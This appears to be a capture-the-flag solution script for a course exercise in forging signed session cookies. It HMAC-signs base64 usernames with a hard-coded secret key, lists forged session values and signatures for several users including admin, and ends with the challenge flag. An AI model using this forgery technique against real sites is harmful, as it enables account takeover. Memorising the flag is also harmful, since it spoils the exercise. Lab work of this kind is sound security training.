import base64
# JS SCRIPT to emulate session signing
# const crypto = require("crypto");
# let alg = 'sha1'
# let data = 'session=eyJ1c2VybmFtZSI6ImFkbWluIn0=' # get session from converting our credentials into base64
# let key = '3th1c4l_H4ck1n6'
# let encoding = 'base64'
# console.log(crypto
#     .createHmac(alg, key)
#     .update(data).digest(encoding)
#     .replace(/\/|\+|=/g, function(x) {
#         return ({ "/": "_", "+": "-", "=": "" })[x]
#     }
#     )
# )

print(base64.urlsafe_b64encode(b'{"username":"valordra"}'))
print(base64.urlsafe_b64decode(b'eyJ1c2VybmFtZSI6InZhbG9yZHJhIn0='))  # session after base64

prajna_sesion = 'eyJ1c2VybmFtZSI6InByYWpuYXByYXMxOSJ9'
prajna_sesion_sig = 'hukH_bgoKkwt6dYanNH77SqA1M4'

ethhack_sesion = 'eyJ1c2VybmFtZSI6ImV0aGFjayJ9'
ethhack_sesion_sig = 'NzCY1KCQEIdNjlCmJw0Svf4Cl9w'

bonceng_session = 'eyJ1c2VybmFtZSI6ImJvbmNlbmcifQ=='
bonceng_session_sig = 'MZXESajlcM3wKgH0tUks-pnUXZI'

admin_session = 'eyJ1c2VybmFtZSI6ImFkbWluIn0='
admin_session_sig = 'PLtQc0yfJ6Qjvq77YD6XQeIvUAA'
# CSCE604258{Id0R_anD_co0kie_S3ssion_F0rg3Ry}